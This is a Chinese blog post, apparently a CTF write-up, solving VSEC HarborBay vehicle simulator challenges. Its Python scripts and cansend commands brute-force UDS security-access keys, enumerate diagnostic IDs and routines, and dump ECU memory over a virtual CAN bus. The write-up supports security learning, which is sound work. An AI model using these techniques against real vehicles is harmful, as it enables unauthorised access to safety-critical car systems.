+seed = binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)[6:10]
+print(f&quot;Seed received: {seed}&quot;)
+
+# 计算 key
+key = f&quot;{~int(seed, 16) &amp; 0xFFFF:04X}&quot;
+; 解释：
+; int(seed, 16)：
+; 将 seed 从十六进制字符串转换为整数类型。
+; ~int(seed, 16)：
+; 对整数取按位反（补码运算）。
+; &amp; 0xFFFF：
+; 仅保留结果的低16位，避免超出Key的范围。
+; :04X：
+; 将结果格式化为4位十六进制字符串（大写）。
+print(f&quot;Calculated key: {key}&quot;)
+
+# 解锁
+print(&quot;Unlocking access...&quot;)
+message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x04, 0x27, 0x04, int(key[0:2], 16), int(key[2:4], 16), 0x00, 0x00, 0x00])
+#0x04：子功能，表示发送Key。
+bus.send(message, timeout=0.2)
+msg = bus.recv()
+print(f&quot;Unlock response: {binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)}&quot;)
+
+# 关闭CAN总线
+bus.shutdown()
+</code></pre>
+<p>ex.py</p>
+<pre><code class="language-python">import can
+import time
+import binascii
+
+# 初始化CAN总线
+bus = can.Bus(interface=&#39;socketcan&#39;, channel=&#39;vcan0&#39;)
+
+# 进入编程诊断会话，03扩展会话不支持23服务的请求
+print(&quot;Entering diagnostic session...&quot;)
+message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x10, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00])
+bus.send(message, timeout=0.2)
+msg = bus.recv()
+
+# 安全访问安全等级为1的会话
+print(&quot;Accessing security level 1...&quot;)
+message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])
+bus.send(message, timeout=0.2)
+msg = bus.recv()
+seed = binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)[6:10]
+
+
+# 计算 key
+key = f&quot;{~int(seed, 16) &amp; 0xFFFF:04X}&quot;
+
+# 解锁
+print(&quot;Unlocking access...&quot;)
+message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x04, 0x27, 0x04, int(key[0:2], 16), int(key[2:4], 16), 0x00, 0x00, 0x00])
+#0x04：子功能，表示发送Key。
+bus.send(message, timeout=0.2)
+msg = bus.recv()
+print(f&quot;Unlock response: {binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)}&quot;)
+
+recvdata = &quot;[DATA]:&quot;
+for hex_value in range(0x1a000, 0x1b000, 0xFF):
+    
+    # 将地址分解为 4 个字节
+    byte1 = (hex_value &gt;&gt; 24) &amp; 0xFF  # 高位字节
+    byte2 = (hex_value &gt;&gt; 16) &amp; 0xFF
+    byte3 = (hex_value &gt;&gt; 8) &amp; 0xFF
+    byte4 = hex_value &amp; 0xFF  
+
+    candata = [0x07, 0x23, 0x14, byte1, byte2, byte3, byte4, 0xFF]
+    message = can.Message(arbitration_id=0x7DF, is_extended_id=False, dlc=8, data=candata)
+    bus.send(message, timeout=0.2)
+    msg = bus.recv()
+
+    recvdata += binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)[6:]#回复帧6位也就是3字节后才是有效数据
+
+    # 发送流控制框（Flow Control Frame），指示 ECU 可以继续发送数据
+    message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+    bus.send(message, timeout=0.2)
+
+    # 继续接收 ECU 的响应，最多 36 条消息，36*7+4=256=0xff
+    temp = 0
+    while temp &lt; 36:
+        msg = bus.recv()
+        tempdata = binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)[2:]
+        if tempdata != &quot;00000000000000&quot;:
+            recvdata += tempdata  # 累积有效数据
+        temp += 1
+
+
+print(&quot;\n========== READMEM ==========&quot;)
+print(recvdata)
+print(&quot;========== READMEM ==========&quot;)
+
+bus.shutdown()
+</code></pre>
+<pre><code class="language-plain">========== READMEM ==========
+[DATA]:4248534d2028736563757265206d656d6f7279290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001587ae9b0000000040be048c00000000000000000000000000000000000000000000
+========== READMEM ==========
+
+========== READMEM ==========
+[DATA]:4248534d2028736563757265206d656d6f727929000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a14d798900000000f474d39e00000000000000000000000000000000000000000000
+========== READMEM ==========
+
+========== READMEM ==========
+[DATA]:4248534d2028736563757265206d656d6f7279290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006f5b6a4f000000003a62c05800000000000000000000000000000000000000000000
+========== READMEM ==========
+</code></pre>
+<p>在后面会记录请求的种子，跟在种子后面还有一串值，长度和种子一样的</p>
+<p>找规律，发现两个异或结果始终为：0x5539aa17，因此猜测该算法是使用种子异或 0x5539aa17</p>
+<h2 id="section-41"><strong>Read Data By Identifier</strong></h2><pre><code class="language-plain">This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.
+这项挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。
+
+Can you identify the data?
+您能识别数据吗？
+</code></pre>
+<p>爆破DID</p>
+<pre><code class="language-python">import can
+import time
+import binascii
+
+bus =  can.Bus(interface=&#39;socketcan&#39;, channel=&#39;vcan0&#39;)
+
+for i in range(0,0xFF):
+    for j in range(0,0xFF):
+        message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x03, 0x22, i, j, 0x00, 0x00, 0x00, 0x00])
+        bus.send(message, timeout=0.2)
+        msg = bus.recv()
+
+bus.shutdown()
+</code></pre>
+<p>当DID发到 0008 的时候就正常读取到了信息</p>
+<pre><code class="language-plain">cansend vcan0 7E0#03220008 &amp;&amp; cansend vcan0 7E0#3000000000000000
+</code></pre>
+<p>得到flag为<code>bh{identified_by_what???}</code></p>
+<h2 id="section-42"><strong>Routine Control</strong></h2><pre><code class="language-plain">This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.
+这项挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。
+
+I hear routine control has a lot of fun features.
+我听说常规控制有很多有趣的功能。
+</code></pre>
+<p>使用 Routine Control 服务来执行已定义的步骤序列并获取任何相关结果，服务 ID 是 0x31</p>
+<p>子功能也比较简单，开始（01）、停止（02）、获取结果（03）</p>
+<p>那先试试开始执行吧，简单试了试都是否定响应，估计也得爆破</p>
+<pre><code class="language-python">import can
+import time
+import binascii
+
+bus =  can.Bus(interface=&#39;socketcan&#39;, channel=&#39;vcan0&#39;)
+
+for i in range(0,0xFF):
+    for j in range(0,0xFF):
+        message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x04, 0x31, 0x01, i, j, 0x00, 0x00, 0x00])
+        bus.send(message, timeout=0.2)
+        msg = bus.recv()
+        result = binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)
+        if result == &quot;037f3131&quot;:
+            pass
+        else:
+            print(&quot;i: &quot;,hex(i),&quot;   j: &quot;,hex(j))
+
+bus.shutdown()
+</code></pre>
+<p>跑了一段时间发现 1337 是响应的，因此先执行 1337 然后再获取结果</p>
+<pre><code class="language-plain">cansend vcan0 7E0#0431011337000000 &amp;&amp; cansend vcan0 7E0#0431031337000000 &amp;&amp; cansend vcan0 7E0#3000000000000000
+</code></pre>
+<p>得到flag为<code>bh{c0ntroll1ng_th3_r0ut1nes}</code></p>
+<h2 id="section-43"><strong>Security Access Level 1</strong></h2><pre><code class="language-plain">This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E User Space Diagnostics Challenge Simulation, then launch the terminal.
+此挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E 用户空间诊断挑战模拟，然后启动终端。
+
+I hear single byte XOR keys are a great security measure, can you prove me wrong?
+我听说单字节 XOR 密钥是一种很好的安全措施，你能证明我错了吗？
+</code></pre>
+<p>进行安全访问时，会先返回一个随机数，key应该就是对这个随机数的每一个字节进行一个异或，异或的值直接爆破</p>
+<p>key.py</p>
+<pre><code class="language-python">import can
+import time
+import binascii
+
+bus =  can.Bus(interface=&#39;socketcan&#39;, channel=&#39;vcan0&#39;)
+
+for key in range(0,0xFF):
+    message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])
+    bus.send(message, timeout=0.2)
+    msg = bus.recv()    
+
+    result = binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)
+    seed = result[6:14]
+
+    key1 = int(seed[:2],16) ^ key
+    key2 = int(seed[2:4],16) ^ key
+    key3 = int(seed[4:6],16) ^ key
+    key4 = int(seed[6:8],16) ^ key
+    
+    message=can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x06, 0x27, 0x02, key1, key2, key3, key4, 0x00])
+    bus.send(message, timeout=0.2)
+    msg = bus.recv()
+    result = binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)
+    if result == &quot;037f2735&quot;:
+        pass
+    else:
+        print(&quot;key is &quot;,hex(key))
+
+bus.shutdown()
+</code></pre>
+<p>最后得到key为0x20</p>
+<p>写脚本访问成功后，发送流控制帧获取flag</p>
+<pre><code class="language-python">import can
+import time
+import binascii
+
+bus =  can.Bus(interface=&#39;socketcan&#39;, channel=&#39;vcan0&#39;)
+
+message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])
+bus.send(message, timeout=0.2)
+msg = bus.recv()
+
+result = binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)
+seed = result[6:14]
+key=0x20
+key1 = int(seed[:2],16) ^ key
+key2 = int(seed[2:4],16) ^ key
+key3 = int(seed[4:6],16) ^ key
+key4 = int(seed[6:8],16) ^ key
+message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x06, 0x27, 0x02, key1, key2, key3, key4, 0x00])
+bus.send(message, timeout=0.2)
+msg = bus.recv()
+
+message=can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+bus.send(message,timeout=0.2)
+msg=bus.recv()
+bus.shutdown()
+</code></pre>
+<p>得到flag为 <code>bh{whats_wrong_with_static_keys?}</code></p>
+<h1>icsim</h1><p>搭建了ICSim总线模拟环境，执行CAN重放、CAN总线逆向、模糊测试</p>
+<p><a href="https://cloud.tencent.com/developer/article/2424289">https://cloud.tencent.com/developer/article/2424289</a></p>
+<p><a href="https://blog.csdn.net/We8__/article/details/128441720">https://blog.csdn.net/We8__/article/details/128441720</a></p>
+<h1>linux can工具命令</h1><table>
+<thead>
+<tr>
+<th>ifconfig</th>
+<th>查看CAN设备状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ip link</td>
+<td>管理和查看网络接口<a href="https://blog.csdn.net/luotuo28/article/details/125000308">ip link 命令总结-CSDN博客</a></td>
+</tr>
+<tr>
+<td>candump +can接口名称</td>
+<td>接收CAN发出的数据</td>
+</tr>
+<tr>
+<td>candump -l vcan0</td>
+<td>得到一个日志文件</td>
+</tr>
+<tr>
+<td>&amp;&amp;</td>
+<td>和一起</td>
+</tr>
+<tr>
+<td>cansend +接口名 +命令</td>
+<td>发送请求</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+</div> <nav class="article-nav" style="display: flex; justify-content: space-between; margin-top: 64px; padding-top: 32px; border-top: 1px solid var(--line);"> <div class="nav-prev" style="flex: 1;"> <a href="/posts/车联网/车机渗透思路/" style="text-decoration: none;"> <p class="muted" style="margin: 0; font-size: 0.9rem; color: var(--muted);">&larr; 上一篇</p> <h4 style="margin: 8px 0 0; color: var(--ink);">车机渗透思路</h4> </a> </div> <div class="nav-next" style="flex: 1; text-align: right;"> <a href="/posts/二进制/pwn/高版本libc堆fd指针绕过/" style="text-decoration: none;"> <p class="muted" style="margin: 0; font-size: 0.9rem; color: var(--muted);">下一篇 &rarr;</p> <h4 style="margin: 8px 0 0; color: var(--ink);">高版本libc堆fd指针绕过</h4> </a> </div> </nav> </div> </article>  <aside class="article-sidebar" id="article-sidebar"> <nav class="article-outline" aria-label="文章目录"> <div class="article-outline__head"> <strong>目录</strong> </div> <div class="article-outline__body"> <ol class="article-outline__list article-outline__list--groups"> <li class="article-outline__group" data-group-id="section-1"> <button class="article-outline__group-link" type="button" data-group-target="section-1"> <span>为什么选can通信而不是以太网</span>  </button>  </li><li class="article-outline__group" data-group-id="section-2"> <button class="article-outline__group-link" type="button" data-group-target="section-2"> <span>结构</span>  </button>  </li><li class="article-outline__group" data-group-id="section-3"> <button class="article-outline__group-link" type="button" data-group-target="section-3"> <span>寻址方式</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-4"> <a href="#section-4">点对点寻址</a> </li><li class="article-outline__item depth-3" data-toc-id="section-5"> <a href="#section-5">广播寻址</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-6"> <button class="article-outline__group-link" type="button" data-group-target="section-6"> <span>报文结构</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-7"> <a href="#section-7">数据帧</a> </li><li class="article-outline__item depth-3" data-toc-id="section-8"> <a href="#section-8">其他</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-9"> <button class="article-outline__group-link" type="button" data-group-target="section-9"> <span>是什么</span>  </button>  </li><li class="article-outline__group" data-group-id="section-10"> <button class="article-outline__group-link" type="button" data-group-target="section-10"> <span>为什么用</span>  </button>  </li><li class="article-outline__group" data-group-id="section-11"> <button class="article-outline__group-link" type="button" data-group-target="section-11"> <span>UDS帧格式和类别</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-12"> <a href="#section-12">请求帧格式：</a> </li><li class="article-outline__item depth-3" data-toc-id="section-13"> <a href="#section-13">响应帧格式：</a> </li><li class="article-outline__item depth-3" data-toc-id="section-14"> <a href="#section-14">帧类别</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-15"> <button class="article-outline__group-link" type="button" data-group-target="section-15"> <span>诊断服务</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-16"> <a href="#section-16">诊断会话是什么</a> </li><li class="article-outline__item depth-3" data-toc-id="section-17"> <a href="#section-17">10服务（诊断会话的切换）</a> </li><li class="article-outline__item depth-3" data-toc-id="section-18"> <a href="#section-18">22服务（读取基础信息数据）</a> </li><li class="article-outline__item depth-3" data-toc-id="section-19"> <a href="#section-19">11服务（ecu重启）</a> </li><li class="article-outline__item depth-3" data-toc-id="section-20"> <a href="#section-20">19服务(读取故障码信息）</a> </li><li class="article-outline__item depth-3" data-toc-id="section-21"> <a href="#section-21">23服务(按地址读取内存)服务</a> </li><li class="article-outline__item depth-3" data-toc-id="section-22"> <a href="#section-22">27服务（安全访问）</a> </li><li class="article-outline__item depth-3" data-toc-id="section-23"> <a href="#section-23">2E（写入数据）</a> </li><li class="article-outline__item depth-3" data-toc-id="section-24"> <a href="#section-24">2F</a> </li><li class="article-outline__item depth-3" data-toc-id="section-25"> <a href="#section-25">总结</a> </li><li class="article-outline__item depth-3" data-toc-id="section-26"> <a href="#section-26">31(常规控制)</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-27"> <button class="article-outline__group-link" type="button" data-group-target="section-27"> <span>虚拟环境</span>  </button>  </li><li class="article-outline__group" data-group-id="section-28"> <button class="article-outline__group-link" type="button" data-group-target="section-28"> <span>特殊仲裁ID</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-29"> <a href="#section-29">0x7DF</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-30"> <button class="article-outline__group-link" type="button" data-group-target="section-30"> <span>Can you find the interface?</span>  </button>  </li><li class="article-outline__group" data-group-id="section-31"> <button class="article-outline__group-link" type="button" data-group-target="section-31"> <span>Arbitration</span>  </button>  </li><li class="article-outline__group" data-group-id="section-32"> <button class="article-outline__group-link" type="button" data-group-target="section-32"> <span>Data Field 1</span>  </button>  </li><li class="article-outline__group" data-group-id="section-33"> <button class="article-outline__group-link" type="button" data-group-target="section-33"> <span>Data Field 2</span>  </button>  </li><li class="article-outline__group" data-group-id="section-34"> <button class="article-outline__group-link" type="button" data-group-target="section-34"> <span>Message Frequency</span>  </button>  </li><li class="article-outline__group" data-group-id="section-35"> <button class="article-outline__group-link" type="button" data-group-target="section-35"> <span>Simulation VIN</span>  </button>  </li><li class="article-outline__group" data-group-id="section-36"> <button class="article-outline__group-link" type="button" data-group-target="section-36"> <span>Startup Message</span>  </button>  </li><li class="article-outline__group" data-group-id="section-37"> <button class="article-outline__group-link" type="button" data-group-target="section-37"> <span>Engine Trouble?</span>  </button>  </li><li class="article-outline__group" data-group-id="section-38"> <button class="article-outline__group-link" type="button" data-group-target="section-38"> <span>Secrets in Memory?</span>  </button>  </li><li class="article-outline__group" data-group-id="section-39"> <button class="article-outline__group-link" type="button" data-group-target="section-39"> <span>Security Access Level 3</span>  </button>  </li><li class="article-outline__group" data-group-id="section-40"> <button class="article-outline__group-link" type="button" data-group-target="section-40"> <span>Security Access Level 1</span>  </button>  </li><li class="article-outline__group" data-group-id="section-41"> <button class="article-outline__group-link" type="button" data-group-target="section-41"> <span>Read Data By Identifier</span>  </button>  </li><li class="article-outline__group" data-group-id="section-42"> <button class="article-outline__group-link" type="button" data-group-target="section-42"> <span>Routine Control</span>  </button>  </li><li class="article-outline__group" data-group-id="section-43"> <button class="article-outline__group-link" type="button" data-group-target="section-43"> <span>Security Access Level 1</span>  </button>  </li> </ol> </div> </nav> </aside>  </div> </div>  </main> <script>
+      (() => {
+        const root = document.documentElement;
+        const scrollFlagKey = "scroll-to-top-once";
+
+        const bindScrollReset = () => {
+          try {
+            if ("scrollRestoration" in history) {
+              history.scrollRestoration = "manual";
+            }
+
+            if (sessionStorage.getItem(scrollFlagKey) === "1") {
+              sessionStorage.removeItem(scrollFlagKey);
+              requestAnimationFrame(() => window.scrollTo({ top: 0, left: 0, behavior: "auto" }));
+            }
+          } catch {}
+
+          document.addEventListener("click", (event) => {
+            const target = event.target;
+            if (!(target instanceof Element)) return;
+
+            const link = target.closest("a");
+            if (!(link instanceof HTMLAnchorElement)) return;
+
+            if (link.target && link.target !== "_self") return;
+            if (link.hasAttribute("download")) return;
+
+            const href = link.getAttribute("href");
+            if (!href || href.startsWith("#")) return;
+
+            try {
+              const url = new URL(link.href, window.location.href);
+              if (url.origin !== window.location.origin) return;
+              if (url.pathname === window.location.pathname && url.hash) return;
+              sessionStorage.setItem(scrollFlagKey, "1");
+            } catch {}
+          });
+        };
+
+        const bindToggle = () => {
+          const btn = document.getElementById("theme-toggle");
+          if (!btn) return;
+          const next = btn.cloneNode(true);
+          btn.replaceWith(next);
+          next.addEventListener("click", () => {
+            const current = root.getAttribute("data-theme") === "dark" ? "dark" : "light";
+            const value = current === "dark" ? "light" : "dark";
+            root.setAttribute("data-theme", value);
+            try {
+              localStorage.setItem("theme", value);
+            } catch {}
+          });
+        };
+
+        bindScrollReset();
+        bindToggle();
+      })();
+    </script> </body> </html>  <script>
+      (() => {
+        const shell = document.getElementById("article-shell");
+        const sidebar = document.getElementById("article-sidebar");
+        const headings = Array.from(document.querySelectorAll(".article-content h2[id], .article-content h3[id]"));
+        const groupLinks = Array.from(document.querySelectorAll(".article-outline__group-link"));
+        const childLinks = Array.from(document.querySelectorAll(".article-outline__sublist a"));
+
+        if (!shell || !sidebar || !outlineNav || !headings.length || !groupLinks.length) return;
+
+        let activeId = "";
+        let activeGroupId = "";
+        let manualOpenGroupId = "";
+        let ticking = false;
+        let suppressOutlineScrollUntil = 0;
+
+        const groupMap = new Map(
+          groupLinks.map((link) => {
+            const id = link.getAttribute("data-group-target") || "";
+            return [id, link.closest(".article-outline__group")];
+          }),
+        );
+
+        let lastH2Id = "";
+        const headingMeta = headings.map((heading) => {
+          const depth = Number(heading.tagName.slice(1));
+          if (depth === 2) lastH2Id = heading.id;
+          return {
+            id: heading.id,
+            depth,
+            parentId: depth === 3 ? lastH2Id : "",
+            element: heading,
+          };
+        });
+
+        const pauseOutlineAutoScroll = (duration = 900) => {
+          suppressOutlineScrollUntil = Date.now() + duration;
+        };
+
+        const setActive = (id, parentId = "") => {
+          if (!id || (id === activeId && parentId === activeGroupId)) return;
+
+          activeId = id;
+          activeGroupId = parentId || id;
+
+          groupLinks.forEach((link) => {
+            const targetId = link.getAttribute("data-group-target") || "";
+            const isCurrentGroup = targetId === activeGroupId;
+            const isOpenGroup = targetId === activeGroupId || targetId === manualOpenGroupId;
+            link.toggleAttribute("aria-current", targetId === id && !parentId);
+            link.classList.toggle("is-current", targetId === id && !parentId);
+            link.classList.toggle("is-open", isOpenGroup);
+            link.classList.toggle("is-active-group", isCurrentGroup);
+          });
+
+          childLinks.forEach((link) => {
+            const targetId = decodeURIComponent((link.getAttribute("href") || "").replace(/^#/, ""));
+            const isCurrent = targetId === id;
+            link.toggleAttribute("aria-current", isCurrent);
+            link.classList.toggle("is-current", isCurrent);
+          });
+
+          groupMap.forEach((group, groupId) => {
+            if (!group) return;
+            group.classList.toggle("is-open", groupId === activeGroupId || groupId === manualOpenGroupId);
+            group.classList.toggle("is-current", groupId === id && !parentId);
+          });
+
+          if (Date.now() < suppressOutlineScrollUntil) return;
+
+          const activeLink = [...groupLinks, ...childLinks].find((link) => {
+            const href = link.getAttribute("href");
+            if (href) return decodeURIComponent(href.replace(/^#/, "")) === id;
+            return (link.getAttribute("data-group-target") || "") === id;
+          });
+          if (!activeLink) return;
+
+          const linkTop = activeLink.offsetTop;
+          const linkBottom = linkTop + activeLink.offsetHeight;
+          const viewTop = outlineNav.scrollTop;
+          const viewBottom = viewTop + outlineNav.clientHeight;
+          const padding = 24;
+
+          if (linkTop - padding < viewTop) {
+            outlineNav.scrollTo({ top: Math.max(linkTop - padding, 0), behavior: "smooth" });
+          } else if (linkBottom + padding > viewBottom) {
+            outlineNav.scrollTo({
+              top: linkBottom - outlineNav.clientHeight + padding,
+              behavior: "smooth",
+            });
+          }
+        };
+
+        const updateOutline = () => {
+          ticking = false;
+
+          let current = headingMeta[0];
+          for (const heading of headingMeta) {
+            if (heading.element.getBoundingClientRect().top <= 160) {
+              current = heading;
+            } else {
+              break;
+            }
+          }
+
+          if (current) {
+            setActive(current.id, current.parentId);
+          }
+        };
+
+        const requestUpdate = () => {
+          if (ticking) return;
+          ticking = true;
+          window.requestAnimationFrame(updateOutline);
+        };
+
+        groupLinks.forEach((button) => {
+          button.addEventListener("click", (event) => {
+            event.stopPropagation();
+            const groupId = button.getAttribute("data-group-target") || "";
+            if (!groupId) return;
+
+            if (manualOpenGroupId === groupId) {
+              manualOpenGroupId = "";
+            } else {
+              manualOpenGroupId = groupId;
+            }
+
+            if (activeGroupId) {
+              setActive(activeId || activeGroupId, activeGroupId);
+            }
+
+            const targetHeading = document.getElementById(groupId);
+            targetHeading?.scrollIntoView({ behavior: "smooth", block: "start" });
+          });
+        });
+
+        childLinks.forEach((link) => {
+          link.addEventListener("click", (event) => {
+            event.preventDefault();
+            event.stopPropagation();
+
+            const targetId = decodeURIComponent((link.getAttribute("href") || "").replace(/^#/, ""));
+            if (!targetId) return;
+
+            const targetMeta = headingMeta.find((item) => item.id === targetId);
+            if (!targetMeta) return;
+
+            pauseOutlineAutoScroll(1200);
+            setActive(targetMeta.id, targetMeta.parentId);
+
+            if (location.hash !== `#${targetId}`) {
+              history.pushState(null, "", `#${targetId}`);
+            }
+
+            targetMeta.element.scrollIntoView({ behavior: "smooth", block: "start" });
+          });
+        });
+
+        window.addEventListener("scroll", requestUpdate, { passive: true });
+        window.addEventListener("resize", requestUpdate);
+        window.addEventListener("hashchange", requestUpdate);
+        requestUpdate();
+      })();
+    </script>
